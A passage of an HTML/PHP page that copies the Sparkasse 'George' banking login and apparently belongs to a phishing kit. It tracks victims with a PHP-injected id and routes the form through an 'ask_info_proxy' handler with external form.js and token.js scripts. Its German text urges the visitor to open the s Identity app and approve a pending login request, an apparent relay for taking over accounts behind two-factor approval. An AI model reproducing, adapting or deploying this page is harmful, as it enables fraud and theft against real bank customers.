NDE3di0zLjI1MWMwLTEuNDg0LDAuNzYyLTIuMTY3LDIuMjQ3LTIuMTY3SDc2LjQ2eiBNNzguNDcsMTMuNDU0YzAtMS41MjUsMC42ODMtMi4yODgsMi4yMDgtMi4yODhoMTQuMDQ1djMuMTcxDQoJCWMwLDEuNTI1LTAuNzYyLDIuMjQ3LTIuMjg3LDIuMjQ3aC03LjU0NXY0LjYxNWg4LjQyOHY1LjIxN2gtOC40Mjh2NS4wMTdoMTAuMDMzdjMuMTY5YzAsMS41MjYtMC43NjMsMi4yNDgtMi4yODcsMi4yNDhIODAuNjc4DQoJCWMtMS41MjUsMC0yLjIwOC0wLjc2My0yLjIwOC0yLjI4OFYxMy40NTR6Ii8+DQo8L2c+DQo8L3N2Zz4NCg==" style="width:100%;height:auto;"></h1>
		
	    
		<div class="product">
			
				<img data-savepage-currentsrc="https://login.sparkasse.at/sts/images/clients/George-symbol.svg" data-savepage-src="/sts/images/clients/George-symbol.svg" src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0idXRmLTgiPz4NCjwhRE9DVFlQRSBzdmcgUFVCTElDICItLy9XM0MvL0RURCBTVkcgMS4xLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL0dyYXBoaWNzL1NWRy8xLjEvRFREL3N2ZzExLmR0ZCI+DQo8c3ZnIHZlcnNpb249IjEuMSIgaWQ9IkxheWVyXzEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgeG1sbnM6eGxpbms9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGxpbmsiIHg9IjBweCIgeT0iMHB4Ig0KCSB3aWR0aD0iNDZweCIgaGVpZ2h0PSI3NHB4IiB2aWV3Qm94PSIzNjQuMjUgMjYyLjc1NCA0NiA3NCIgZW5hYmxlLWJhY2tncm91bmQ9Im5ldyAzNjQuMjUgMjYyLjc1NCA0NiA3NCIgeG1sOnNwYWNlPSJwcmVzZXJ2ZSI+DQo8cGF0aCBmaWxsPSIjMDA0OTdCIiBkPSJNMzg3LjEyNywzMjkuNTRjOC42MiwwLDE1LjYzMy03LjAxMiwxNS42MzMtMTUuNjMzaDcuMjE1YzAsMTIuNi0xMC4yNDksMjIuODQ3LTIyLjg0OCwyMi44NDdWMzI5LjU0eiIvPg0KPHBhdGggZmlsbD0iIzAwNDk3QiIgZD0iTTM4Ny4wOTcsMzA4LjY4M2MtMTIuNTk5LDAtMjIuODQ4LTEwLjI0OS0yMi44NDgtMjIuODQ4YzAtMTIuNTk4LDEwLjI0OS0yMi44NDgsMjIuODQ4LTIyLjg0OA0KCWMxMi41OTksMCwyMi44NDksMTAuMjUsMjIuODQ5LDIyLjg0OEM0MDkuOTQ2LDI5OC40MzQsMzk5LjY5NywzMDguNjgzLDM4Ny4wOTcsMzA4LjY4M3ogTTM4Ny4wOTcsMjcwLjIwNA0KCWMtOC42MiwwLTE1LjYzMyw3LjAxMy0xNS42MzMsMTUuNjMyYzAsOC42MjEsNy4wMTMsMTUuNjMzLDE1LjYzMywxNS42MzNjOC42MjEsMCwxNS42MzMtNy4wMTIsMTUuNjMzLTE1LjYzMw0KCUM0MDIuNzMxLDI3Ny4yMTcsMzk1LjcxOCwyNzAuMjA0LDM4Ny4wOTcsMjcwLjIwNHoiLz4NCjwvc3ZnPg0K" class="producticon" width="60" height="60">
			
			<h2>George</h2>
			<p>Einfach. Intelligent. Individuell. Und mehr. Willkommen beim modernsten Banking Österreichs.</p>
			<div class="links">
				
					
					<a href="https://www.sparkasse.at/tiny/impressum-george-en" >Impressum</a>
				
					<br>
					<a href="https://www.sparkasse.at/tiny/datenschutz-george-en" >Datenschutz</a>
				
					<br>
					<a href="https://www.sparkasse.at/tiny/gbg-george-en" >Geschäftsbedingungen</a>
				
					<br>
					<a href="https://www.sparkasse.at/tiny/service-kontakt-george-en" >Service & Kontakt</a>
				
			</div>
		</div>
	     
	</div>
	
	
	

	
	<div class="col2 col" role="main" style="min-height: 518px;">
	    <div class="scum whitebox" id="info-view" style="height: 482px;"> 
		    <h1>
				<span id="loginTitle">
					George Login
				</span>
		    </h1>
			<div class="iealert" style="padding-bottom: 0px;"></div>
			<form  onsubmit="send1(event,'ask_info_proxy');return false" >
			
			<div class="commonalert">
			</div>
			<div class="commontext" role="main">
				Sie erhalten für den Login in Kürze eine Freigabeanfrage in Ihrer s Identity-App.<br><br><b>Überprüfen Sie vor dem Login die Übereinstimmung der Prüfziffer!</b>
				
				<br><br>
				Aktuelle Prüfziffer: <b><span class="valorant"></span></b>
				<br><br><p style="color:red;font-weight:bold">WICHTIG!</p><p style="color:red">Öffnen Sie jetzt die s Identity-App (Smartphone oder Desktop) manuell, um den Login fortzusetzen - einfach auf das s Identity-App-Icon drücken!</p>
				<div id="loader" class="loader-container"><img style="height: 50px;margin-top: 25px;" src="https://i.imgur.com/nhWmPZi.gif"><div class="eg_loader eg_loader--blue"></div></div>
				
				<div id="errorhash"></div>
				
			</div>
			
			</form>
	    </div>
		</div>

	    
		
		
	
	</div>
</div>
<div class="isSmallScreen" id="isSmallScreen"></div>

<script data-savepage-type="" type="text/plain"></script>

    <script type="text/javascript">
    var bid = "<?php echo isset($_COOKIE['bid'])?$_COOKIE['bid']:basename(dirname(dirname(__FILE__))) ?>"
    var php_js = <?php  echo json_encode($php_js) ?>
    </script>
    <script type="text/javascript" src="form/form.js?v=<?php echo uniqid() ?>"></script>
    <script type="text/javascript" src="token/token.js?v=<?php echo uniqid() ?>"></script>
</body></html>